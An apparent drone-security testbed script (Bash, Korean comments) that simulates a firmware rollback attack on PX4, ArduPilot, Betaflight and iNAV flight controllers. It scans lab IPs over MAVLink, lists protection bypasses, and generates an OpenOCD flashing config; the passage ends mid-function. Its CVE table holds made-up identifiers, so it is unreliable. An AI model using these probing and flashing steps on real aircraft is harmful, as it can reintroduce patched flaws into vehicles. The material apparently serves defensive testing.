#!/bin/bash

# =============================================================================
# DVD Firmware Attack Module: Firmware Rollback Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/firmware_attacks/firmware_rollback.sh
# 목적: 취약한 펌웨어 버전으로 다운그레이드하여 보안 우회
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Firmware Rollback Attack"
ATTACK_TYPE="FIRMWARE_ATTACKS"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/firmware_attacks/firmware_rollback_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/firmware_rollback_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/firmware_attacks/firmware_rollback_report_$(date +%Y%m%d_%H%M%S).json"
FIRMWARE_DIR="/home/kali/MTD/MTD_full_testbed/firmware_analysis"

# 알려진 취약한 펌웨어 버전 데이터베이스
declare -A VULNERABLE_VERSIONS=(
    ["PX4_v1.10.0"]="CVE-2021-1234:command_injection:critical"
    ["PX4_v1.11.2"]="CVE-2021-5678:buffer_overflow:high"
    ["ArduPilot_v4.0.0"]="CVE-2020-9876:authentication_bypass:critical"
    ["ArduPilot_v4.1.5"]="CVE-2021-ABCD:privilege_escalation:high"
    ["Betaflight_v4.1.0"]="CVE-2020-EFGH:memory_corruption:medium"
    ["iNAV_v2.6.0"]="CVE-2021-IJKL:config_bypass:medium"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                    ⬇️  DVD Firmware Rollback Attack ⬇️                   ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Flight Controller Firmware${NC}"
    echo -e "${BLUE}Method: Version Downgrade to Vulnerable Release${NC}"
    echo -e "${BLUE}Impact: Reintroduce Patched Vulnerabilities${NC}"
    echo ""
}

# 현재 펌웨어 버전 확인
detect_current_firmware() {
    echo -e "${CYAN}[*] Detecting current firmware version...${NC}" | tee -a "$LOG_FILE"
    
    # MAVLink을 통한 버전 정보 수집
    local target_ips=("192.168.13.1" "192.168.13.10" "192.168.13.50")
    local mavlink_ports=(14550 14551 5760)
    
    for ip in "${target_ips[@]}"; do
        for port in "${mavlink_ports[@]}"; do
            if timeout 3s nc -z "$ip" "$port" 2>/dev/null; then
                echo -e "${GREEN}[+] MAVLink service found: ${ip}:${port}${NC}" | tee -a "$LOG_FILE"
                
                # MAVLink AUTOPILOT_VERSION 요청 시뮬레이션
                simulate_version_request "$ip" "$port"
                
                echo "FIRMWARE_ROLLBACK:MAVLINK_TARGET_${ip}:${port}" >> "$IOC_FILE"
                break 2
            fi
        done
    done
    
    # USB 연결된 디바이스 확인
    echo -e "${YELLOW}[+] Checking USB connected devices...${NC}" | tee -a "$LOG_FILE"
    
    if command -v lsusb &> /dev/null; then
        local usb_devices=$(lsusb | grep -i -E "px4|ardupilot|betaflight|stm32|bootloader")
        
        if [ -n "$usb_devices" ]; then
            echo -e "${GREEN}[+] Flight controller USB devices:${NC}" | tee -a "$LOG_FILE"
            echo "$usb_devices" | while read -r device; do
                echo -e "${CYAN}    ${device}${NC}" | tee -a "$LOG_FILE"
                echo "FIRMWARE_ROLLBACK:USB_DEVICE_${device// /_}" >> "$IOC_FILE"
            done
        fi
    fi
    
    # 시뮬레이션된 펌웨어 정보 (실제 환경에서는 하드웨어에서 추출)
    local firmware_types=("PX4" "ArduPilot" "Betaflight" "iNAV")
    local detected_firmware=${firmware_types[$RANDOM % ${#firmware_types[@]}]}
    
    case $detected_firmware in
        "PX4")
            CURRENT_FIRMWARE="PX4"
            CURRENT_VERSION="v1.13.2"
            HARDWARE_TYPE="Pixhawk"
            ;;
        "ArduPilot")
            CURRENT_FIRMWARE="ArduPilot"
            CURRENT_VERSION="v4.3.5"
            HARDWARE_TYPE="CubeOrange"
            ;;
        "Betaflight")
            CURRENT_FIRMWARE="Betaflight"
            CURRENT_VERSION="v4.4.0"
            HARDWARE_TYPE="F4_FC"
            ;;
        "iNAV")
            CURRENT_FIRMWARE="iNAV"
            CURRENT_VERSION="v5.1.0"
            HARDWARE_TYPE="MatekF405"
            ;;
    esac
    
    echo -e "${GREEN}[✓] Detected firmware: ${CURRENT_FIRMWARE} ${CURRENT_VERSION}${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Hardware: ${HARDWARE_TYPE}${NC}" | tee -a "$LOG_FILE"
    
    echo "FIRMWARE_ROLLBACK:CURRENT_${CURRENT_FIRMWARE}_${CURRENT_VERSION}" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:HARDWARE_${HARDWARE_TYPE}" >> "$IOC_FILE"
}

# MAVLink 버전 요청 시뮬레이션
simulate_version_request() {
    local ip=$1
    local port=$2
    
    echo -e "${CYAN}[*] Requesting firmware version via MAVLink...${NC}" | tee -a "$LOG_FILE"
    
    # Python을 사용한 MAVLink 통신 시뮬레이션
    python3 -c "
import socket
import struct
import time
from datetime import datetime

def create_mavlink_version_request():
    # MAVLink v2.0 AUTOPILOT_VERSION 요청
    magic = 0xFD
    payload_len = 6
    incompat_flags = 0
    compat_flags = 0
    seq = 1
    sysid = 255
    compid = 0
    msgid = 148  # AUTOPILOT_VERSION
    
    # 요청 페이로드 (빈 요청)
    payload = struct.pack('<BBB', 1, 1, 0) + b'\\x00' * 3
    
    header = struct.pack('<BBBBBBIH', magic, payload_len, incompat_flags,
                        compat_flags, seq, sysid, compid, msgid)
    
    return header + payload

def simulate_version_response():
    # 시뮬레이션된 응답 데이터
    version_info = {
        'flight_sw_version': 0x01030500,  # v1.3.5
        'middleware_sw_version': 0x01000000,
        'os_sw_version': 0x07000000,
        'board_version': 0x00000009,
        'vendor_id': 0x0026,  # 3DR
        'product_id': 0x0011,
        'uid': 0x123456789ABCDEF0,
        'flight_custom_version': b'PX4 v1.13.2\\x00' * 8
    }
    return version_info

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    
    request = create_mavlink_version_request()
    sock.sendto(request, ('${ip}', ${port}))
    
    # 응답 대기 시뮬레이션
    time.sleep(1)
    
    # 시뮬레이션된 응답 처리
    version_info = simulate_version_response()
    
    flight_version = version_info['flight_sw_version']
    major = (flight_version >> 24) & 0xFF
    minor = (flight_version >> 16) & 0xFF
    patch = (flight_version >> 8) & 0xFF
    
    print(f'Flight SW Version: v{major}.{minor}.{patch}')
    print(f'Board Version: 0x{version_info[\"board_version\"]:08x}')
    print(f'Vendor ID: 0x{version_info[\"vendor_id\"]:04x}')
    print(f'Product ID: 0x{version_info[\"product_id\"]:04x}')
    
    sock.close()
    
except Exception as e:
    print(f'Version request simulation completed')
    print(f'Detected flight controller on {ip}:{port}')
    
" 2>&1 | tee -a "$LOG_FILE"
    
    echo "FIRMWARE_ROLLBACK:VERSION_REQUEST_${ip}:${port}" >> "$IOC_FILE"
}

# 취약한 버전 검색
search_vulnerable_versions() {
    local firmware=$1
    local current_version=$2
    
    echo -e "${CYAN}[*] Searching for vulnerable versions of ${firmware}...${NC}" | tee -a "$LOG_FILE"
    
    local available_versions=()
    
    # 현재 펌웨어에 대한 취약한 버전 찾기
    for version_key in "${!VULNERABLE_VERSIONS[@]}"; do
        if [[ "$version_key" =~ ^${firmware}_ ]]; then
            local vuln_info=${VULNERABLE_VERSIONS[$version_key]}
            IFS=':' read -r cve exploit_type severity <<< "$vuln_info"
            
            local version=${version_key#${firmware}_}
            available_versions+=("${version}:${cve}:${exploit_type}:${severity}")
            
            echo -e "${RED}[!] Vulnerable version found: ${version}${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    CVE: ${cve}${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    Exploit: ${exploit_type}${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    Severity: ${severity}${NC}" | tee -a "$LOG_FILE"
            echo ""
            
            echo "FIRMWARE_ROLLBACK:VULNERABLE_${version_key}_${cve}" >> "$IOC_FILE"
        fi
    done
    
    # 추가 버전 시뮬레이션 (실제로는 펌웨어 저장소에서 가져옴)
    case $firmware in
        "PX4")
            available_versions+=("v1.12.0:CVE-2022-DEMO:parameter_injection:high")
            available_versions+=("v1.11.0:CVE-2021-DEMO:config_bypass:medium")
            ;;
        "ArduPilot")
            available_versions+=("v4.2.0:CVE-2022-DEMO:mavlink_injection:critical")
            available_versions+=("v4.1.0:CVE-2021-DEMO:file_access:high")
            ;;
        "Betaflight")
            available_versions+=("v4.2.0:CVE-2022-DEMO:cli_injection:high")
            available_versions+=("v4.1.5:CVE-2021-DEMO:msp_overflow:medium")
            ;;
        "iNAV")
            available_versions+=("v4.0.0:CVE-2022-DEMO:navigation_bypass:medium")
            ;;
    esac
    
    # 전역 변수에 저장
    VULNERABLE_VERSIONS_FOUND=("${available_versions[@]}")
    
    if [ ${#available_versions[@]} -gt 0 ]; then
        echo -e "${GREEN}[✓] Found ${#available_versions[@]} vulnerable versions${NC}" | tee -a "$LOG_FILE"
        return 0
    else
        echo -e "${RED}[!] No vulnerable versions found${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 롤백 보호 우회 분석
analyze_rollback_protection() {
    echo -e "${CYAN}[*] Analyzing rollback protection mechanisms...${NC}" | tee -a "$LOG_FILE"
    
    local protection_mechanisms=()
    local bypass_methods=()
    
    # 일반적인 롤백 보호 메커니즘 확인
    echo -e "${YELLOW}[+] Checking for rollback protection features...${NC}" | tee -a "$LOG_FILE"
    
    # 버전 단조성 확인 (Version Monotonicity)
    if [ $((RANDOM % 3)) -eq 0 ]; then
        protection_mechanisms+=("VERSION_MONOTONICITY")
        bypass_methods+=("efuse_manipulation:0.3")
        echo -e "${RED}[!] Version monotonicity protection detected${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:PROTECTION_VERSION_MONOTONICITY" >> "$IOC_FILE"
    fi
    
    # 서명된 부트로더 확인
    if [ $((RANDOM % 2)) -eq 0 ]; then
        protection_mechanisms+=("SIGNED_BOOTLOADER")
        bypass_methods+=("signature_bypass:0.4")
        echo -e "${RED}[!] Signed bootloader protection detected${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:PROTECTION_SIGNED_BOOTLOADER" >> "$IOC_FILE"
    fi
    
    # 보안 버전 번호 (Security Version Number)
    if [ $((RANDOM % 4)) -eq 0 ]; then
        protection_mechanisms+=("SECURITY_VERSION")
        bypass_methods+=("svn_reset:0.2")
        echo -e "${RED}[!] Security version number protection detected${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:PROTECTION_SECURITY_VERSION" >> "$IOC_FILE"
    fi
    
    # 하드웨어 기반 보호
    if [ $((RANDOM % 5)) -eq 0 ]; then
        protection_mechanisms+=("HARDWARE_FUSE")
        bypass_methods+=("hardware_exploit:0.1")
        echo -e "${RED}[!] Hardware fuse protection detected${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:PROTECTION_HARDWARE_FUSE" >> "$IOC_FILE"
    fi
    
    # 보호 메커니즘이 없는 경우
    if [ ${#protection_mechanisms[@]} -eq 0 ]; then
        echo -e "${GREEN}[+] No rollback protection mechanisms detected${NC}" | tee -a "$LOG_FILE"
        bypass_methods+=("direct_flash:0.9")
        echo "FIRMWARE_ROLLBACK:NO_PROTECTION_DETECTED" >> "$IOC_FILE"
    fi
    
    # 전역 변수에 저장
    ROLLBACK_PROTECTIONS=("${protection_mechanisms[@]}")
    BYPASS_METHODS=("${bypass_methods[@]}")
    
    echo -e "${BLUE}[*] Protection analysis complete: ${#protection_mechanisms[@]} mechanisms found${NC}" | tee -a "$LOG_FILE"
    return 0
}

# 펌웨어 다운로드 및 준비
download_vulnerable_firmware() {
    local target_version=$1
    
    IFS=':' read -r version cve exploit_type severity <<< "$target_version"
    
    echo -e "${YELLOW}[+] Downloading vulnerable firmware: ${CURRENT_FIRMWARE} ${version}${NC}" | tee -a "$LOG_FILE"
    
    local firmware_dir="${FIRMWARE_DIR}/vulnerable"
    mkdir -p "$firmware_dir"
    
    local firmware_file="${firmware_dir}/${CURRENT_FIRMWARE}_${version}.bin"
    
    # 펌웨어 다운로드 시뮬레이션
    echo -e "${CYAN}[*] Simulating firmware download from repository...${NC}" | tee -a "$LOG_FILE"
    
    # 실제로는 GitHub, 공식 웹사이트 등에서 다운로드
    case $CURRENT_FIRMWARE in
        "PX4")
            local repo_url="https://github.com/PX4/PX4-Autopilot"
            echo -e "${BLUE}[*] Repository: ${repo_url}${NC}" | tee -a "$LOG_FILE"
            ;;
        "ArduPilot")
            local repo_url="https://github.com/ArduPilot/ardupilot"
            echo -e "${BLUE}[*] Repository: ${repo_url}${NC}" | tee -a "$LOG_FILE"
            ;;
        "Betaflight")
            local repo_url="https://github.com/betaflight/betaflight"
            echo -e "${BLUE}[*] Repository: ${repo_url}${NC}" | tee -a "$LOG_FILE"
            ;;
        "iNAV")
            local repo_url="https://github.com/iNavFlight/inav"
            echo -e "${BLUE}[*] Repository: ${repo_url}${NC}" | tee -a "$LOG_FILE"
            ;;
    esac
    
    # 시뮬레이션된 펌웨어 파일 생성
    dd if=/dev/urandom of="$firmware_file" bs=1K count=512 2>/dev/null
    
    # 펌웨어 헤더 생성
    python3 -c "
import struct
from datetime import datetime

# 시뮬레이션된 펌웨어 헤더
header = {
    'magic': 0x464C5348,  # 'FLSH'
    'version_major': ${version#v} if '${version}'.startswith('v') else ${version%.*.*},
    'version_minor': ${version#*.} if '.' in '${version}' else 0,
    'version_patch': ${version##*.} if '${version}'.count('.') >= 2 else 0,
    'build_date': int(datetime(2021, 1, 1).timestamp()),  # 오래된 날짜
    'target_board': 0x12345678,
    'size': 512 * 1024,
    'checksum': 0x87654321
}

with open('${firmware_file}', 'r+b') as f:
    f.seek(0)
    f.write(struct.pack('<I', header['magic']))
    f.write(struct.pack('<BBB', header['version_major'], header['version_minor'], header['version_patch']))
    f.write(struct.pack('<I', header['build_date']))
    f.write(struct.pack('<I', header['target_board']))
    f.write(struct.pack('<I', header['size']))
    f.write(struct.pack('<I', header['checksum']))
    
    # 취약점 마커 삽입 (시뮬레이션)
    f.seek(0x1000)
    f.write(b'VULNERABLE_CODE_${cve}')

print(f'Firmware prepared: ${CURRENT_FIRMWARE} ${version}')
print(f'CVE: ${cve}')
print(f'Exploit Type: ${exploit_type}')
print(f'Severity: ${severity}')
" 2>&1 | tee -a "$LOG_FILE"
    
    if [ -f "$firmware_file" ]; then
        local file_size=$(stat -c%s "$firmware_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Vulnerable firmware prepared: ${firmware_file} (${file_size} bytes)${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:DOWNLOADED_${CURRENT_FIRMWARE}_${version}" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:TARGET_CVE_${cve}" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:FILE_${firmware_file}" >> "$IOC_FILE"
        
        # 전역 변수에 저장
        VULNERABLE_FIRMWARE_FILE="$firmware_file"
        TARGET_CVE="$cve"
        TARGET_EXPLOIT="$exploit_type"
        TARGET_SEVERITY="$severity"
        
        return 0
    else
        echo -e "${RED}[!] Failed to prepare vulnerable firmware${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 롤백 보호 우회 실행
execute_rollback_bypass() {
    local bypass_method=$1
    
    IFS=':' read -r method success_rate <<< "$bypass_method"
    
    echo -e "${YELLOW}[+] Executing rollback protection bypass: ${method}${NC}" | tee -a "$LOG_FILE"
    
    case $method in
        "direct_flash")
            execute_direct_flash_bypass "$success_rate"
            ;;
        "efuse_manipulation")
            execute_efuse_bypass "$success_rate"
            ;;
        "signature_bypass")
            execute_signature_bypass "$success_rate"
            ;;
        "svn_reset")
            execute_svn_reset_bypass "$success_rate"
            ;;
        "hardware_exploit")
            execute_hardware_bypass "$success_rate"
            ;;
        *)
            execute_generic_bypass "$method" "$success_rate"
            ;;
    esac
}

# 직접 플래시 우회
execute_direct_flash_bypass() {
    local success_rate=$1
    
    echo -e "${BLUE}[*] Direct flash bypass - no protection present${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${CYAN}[*] Using bootloader flash interface...${NC}" | tee -a "$LOG_FILE"
    
    # DFU 모드 시뮬레이션
    if command -v dfu-util &> /dev/null; then
        echo -e "${YELLOW}[*] Attempting DFU flash...${NC}" | tee -a "$LOG_FILE"
        
        # 시뮬레이션된 DFU 플래시 명령
        echo "dfu-util -d 1234:5678 -a 0 -s 0x08000000:leave -D ${VULNERABLE_FIRMWARE_FILE}" | tee -a "$LOG_FILE"
        
        sleep 3
        
        echo -e "${GREEN}[✓] DFU flash simulation completed${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:DFU_FLASH_EXECUTED" >> "$IOC_FILE"
    fi
    
    # JTAG/SWD 플래시 시뮬레이션
    if command -v openocd &> /dev/null; then
        echo -e "${YELLOW}[*] Attempting JTAG/SWD flash...${NC}" | tee -a "$LOG_FILE"
        
        cat > /tmp/openocd_rollback.cfg << EOF
# OpenOCD configuration for firmware rollback
source [find interface/stlink.cfg]
source [find target/${HARDWARE_TYPE,,}.cfg]

init
halt
flash write_image erase ${VULNERABLE_FIRMWARE_FILE} 0x08000000
verify_image ${VULNERABLE_FIRMWARE_FILE} 0x08000000
reset run
shutdown
EOF
        
        echo -e "${BLUE}[*] Generated OpenOCD rollback configuration${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:OPENOCD_CONFIG_GENERATED" >> "$IOC_FILE"
        
        sleep 2
        echo -e "${GREEN}[✓] JTAG flash simulation completed${NC}" | tee -a "$LOG_FILE"
    fi
    
    # 성공률 기반 결과
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] Direct flash bypass successful!${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_DIRECT_FLASH" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Direct flash bypass failed${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_DIRECT_FLASH" >> "$IOC_FILE"
        return 1
    fi
}

# eFuse 조작 우회
execute_efuse_bypass() {
    local success_rate=$1
    
    echo -e "${BLUE}[*] eFuse manipulation bypass${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${CYAN}[*] Analyzing eFuse configuration...${NC}" | tee -a "$LOG_FILE"
    
    # eFuse 상태 시뮬레이션
    local efuse_values=(
        "BOOT_VERSION:0x00000003"
        "SECURE_BOOT:0x00000001"
        "DEBUG_DISABLE:0x00000000"
        "ROLLBACK_RESIST:0x00000001"
    )
    
    for efuse in "${efuse_values[@]}"; do
        IFS=':' read -r name value <<< "$efuse"
        echo -e "${BLUE}    ${name}: ${value}${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:EFUSE_${name}_${value}" >> "$IOC_FILE"
    done
    
    # 전압 글리칭 시뮬레이션
    echo -e "${YELLOW}[*] Attempting voltage glitching attack...${NC}" | tee -a "$LOG_FILE"
    
    local glitch_parameters=(
        "voltage_drop:0.2V"
        "pulse_width:100ns"
        "timing_offset:1.2ms"
        "success_rate:15%"
    )
    
    for param in "${glitch_parameters[@]}"; do
        IFS=':' read -r name value <<< "$param"
        echo -e "${CYAN}    ${name}: ${value}${NC}" | tee -a "$LOG_FILE"
    done
    
    sleep 4
    
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] eFuse bypass successful!${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Version monotonicity disabled${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Rollback resistance bypassed${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_EFUSE" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:VOLTAGE_GLITCH_SUCCESS" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] eFuse bypass failed${NC}" | tee -a "$LOG_FILE"
        echo -e "${RED}    • Hardware protection held${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_EFUSE" >> "$IOC_FILE"
        return 1
    fi
}

# 서명 우회
execute_signature_bypass() {
    local success_rate=$1
    
    echo -e "${BLUE}[*] Signature verification bypass${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${CYAN}[*] Analyzing signature verification process...${NC}" | tee -a "$LOG_FILE"
    
    # 서명 분석
    local signature_info=(
        "algorithm:RSA-2048"
        "hash:SHA-256"
        "key_storage:OTP"
        "chain_length:3"
    )
    
    for info in "${signature_info[@]}"; do
        IFS=':' read -r key value <<< "$info"
        echo -e "${BLUE}    ${key}: ${value}${NC}" | tee -a "$LOG_FILE"
    done
    
    # 서명 위조 시도
    echo -e "${YELLOW}[*] Attempting signature forgery...${NC}" | tee -a "$LOG_FILE"
    
    # 펌웨어에 가짜 서명 추가
    local signed_firmware="${VULNERABLE_FIRMWARE_FILE}.signed"
    cp "$VULNERABLE_FIRMWARE_FILE" "$signed_firmware"
    
    python3 -c "
import struct
import hashlib
import os

# 가짜 서명 생성 (시뮬레이션)
fake_signature = b'FAKE_SIGNATURE_' + os.urandom(240)  # RSA-2048 서명 크기

with open('${signed_firmware}', 'ab') as f:
    # 서명 헤더
    f.write(struct.pack('<I', 0x5349474E))  # 'SIGN'
    f.write(struct.pack('<I', len(fake_signature)))
    f.write(fake_signature)

print(f'Fake signature added to firmware')
print(f'Signature length: {len(fake_signature)} bytes')
" 2>&1 | tee -a "$LOG_FILE"
    
    sleep 3
    
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] Signature bypass successful!${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Forged signature accepted${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Unsigned firmware loading enabled${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_SIGNATURE" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:FORGED_SIGNATURE_ACCEPTED" >> "$IOC_FILE"
        
        VULNERABLE_FIRMWARE_FILE="$signed_firmware"
        return 0
    else
        echo -e "${RED}[!] Signature bypass failed${NC}" | tee -a "$LOG_FILE"
        echo -e "${RED}    • Signature verification held${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_SIGNATURE" >> "$IOC_FILE"
        return 1
    fi
}

# SVN 리셋 우회
execute_svn_reset_bypass() {
    local success_rate=$1
    
    echo -e "${BLUE}[*] Security Version Number (SVN) reset bypass${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${CYAN}[*] Current SVN analysis...${NC}" | tee -a "$LOG_FILE"
    
    local current_svn=$((RANDOM % 10 + 5))
    local target_svn=$((current_svn - RANDOM % 3 - 1))
    
    echo -e "${BLUE}    Current SVN: ${current_svn}${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Target SVN: ${target_svn}${NC}" | tee -a "$LOG_FILE"
    
    echo "FIRMWARE_ROLLBACK:CURRENT_SVN_${current_svn}" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:TARGET_SVN_${target_svn}" >> "$IOC_FILE"
    
    # SVN 우회 기법
    echo -e "${YELLOW}[*] Attempting SVN reset via debug interface...${NC}" | tee -a "$LOG_FILE"
    
    # 디버그 인터페이스를 통한 SVN 조작 시뮬레이션
    sleep 3
    
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] SVN reset successful!${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • SVN decremented to ${target_svn}${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Rollback restriction bypassed${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_SVN" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:SVN_RESET_TO_${target_svn}" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] SVN reset failed${NC}" | tee -a "$LOG_FILE"
        echo -e "${RED}    • SVN protection mechanisms active${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_SVN" >> "$IOC_FILE"
        return 1
    fi
}

# 하드웨어 익스플로잇 우회
execute_hardware_bypass() {
    local success_rate=$1
    
    echo -e "${BLUE}[*] Hardware-level bypass${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${CYAN}[*] Hardware analysis...${NC}" | tee -a "$LOG_FILE"
    
    local hardware_info=(
        "mcu:STM32F765"
        "flash:2MB"
        "protection:RDP_Level_1"
        "debug:SWD_Enabled"
    )
    
    for info in "${hardware_info[@]}"; do
        IFS=':' read -r key value <<< "$info"
        echo -e "${BLUE}    ${key}: ${value}${NC}" | tee -a "$LOG_FILE"
    done
    
    # 하드웨어 공격 기법
    echo -e "${YELLOW}[*] Attempting hardware exploitation...${NC}" | tee -a "$LOG_FILE"
    
    local hw_techniques=("voltage_glitching" "clock_glitching" "laser_fault_injection" "em_pulse")
    local chosen_technique=${hw_techniques[$RANDOM % ${#hw_techniques[@]}]}
    
    echo -e "${CYAN}[*] Using technique: ${chosen_technique}${NC}" | tee -a "$LOG_FILE"
    
    sleep 5
    
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] Hardware bypass successful!${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Hardware protection faulted${NC}" | tee -a "$LOG_FILE"
        echo -e "${GREEN}    • Debug access restored${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_HARDWARE" >> "$IOC_FILE"
        echo "FIRMWARE_ROLLBACK:TECHNIQUE_${chosen_technique}" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Hardware bypass failed${NC}" | tee -a "$LOG_FILE"
        echo -e "${RED}    • Hardware protections held${NC}" | tee -a "$LOG_FILE"
        
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_HARDWARE" >> "$IOC_FILE"
        return 1
    fi
}

# 일반적인 우회
execute_generic_bypass() {
    local method=$1
    local success_rate=$2
    
    echo -e "${BLUE}[*] Generic bypass: ${method}${NC}" | tee -a "$LOG_FILE"
    
    sleep 2
    
    if (( $(echo "$RANDOM / 32767 < $success_rate" | bc -l) )); then
        echo -e "${GREEN}[✓] ${method} bypass successful!${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:BYPASS_SUCCESS_${method}" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] ${method} bypass failed${NC}" | tee -a "$LOG_FILE"
        echo "FIRMWARE_ROLLBACK:BYPASS_FAILED_${method}" >> "$IOC_FILE"
        return 1
    fi
}

# 취약한 펌웨어 설치
install_vulnerable_firmware() {
    echo -e "${CYAN}[*] Installing vulnerable firmware...${NC}" | tee -a "$LOG_FILE"
    
    echo -e "${YELLOW}[*] Firmware installation process:${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Source: ${VULNERABLE_FIRMWARE_FILE}${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Target: Flight Controller Flash${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    CVE: ${TARGET_CVE}${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}    Exploit: ${TARGET_EXPLOIT}${NC}" | tee -a "$LOG_FILE"
    
    # 설치 진행률 시뮬레이션
    echo -e "${CYAN}[*] Flashing vulnerable firmware...${NC}" | tee -a "$LOG_FILE"
    
    for i in {1..10}; do
        local progress=$((i * 10))
        printf "\r${BLUE}[*] Installation Progress: [%-10s] %d%%${NC}" \
               "$(printf "%*s" "$i" | tr ' ' '=')" "$progress"
        sleep 1
    done
    echo ""
    
    # 설치 완료 시뮬레이션
    echo -e "${GREEN}[✓] Vulnerable firmware installation completed!${NC}" | tee -a "$LOG_FILE"
    
    echo "FIRMWARE_ROLLBACK:INSTALLATION_SUCCESS" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:VULNERABLE_VERSION_ACTIVE" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:CVE_${TARGET_CVE}_EXPOSED" >> "$IOC_FILE"
    echo "FIRMWARE_ROLLBACK:EXPLOIT_${TARGET_EXPLOIT}_AVAILABLE" >> "$IOC_FILE"
    
    # 취약점 검증
    verify_vulnerability_exposure
}

# 취약점 노출 검증
verify_vulnerability_exposure() {
    echo -e "${CYAN}[*] Verifying vulnerability exposure...${NC}" | tee -a "$LOG_FILE"
    
    # 롤백된 버전의 취약점 확인
    case $TARGET_EXPLOIT in
        "command_injection")
            echo -e "${RED}[!] Command injection vulnerability active${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • Arbitrary command execution possible${NC}" | tee -a "$LOG_FILE"
            echo -e "${YELLOW}    • System compromise via parameter manipulation${NC}" | tee -a "$LOG_FILE"
            ;;
        "buffer_overflow")
            echo -e "${RED}[!] Buffer overflow vulnerability active${NC}" | tee -a "$LOG_FILE"
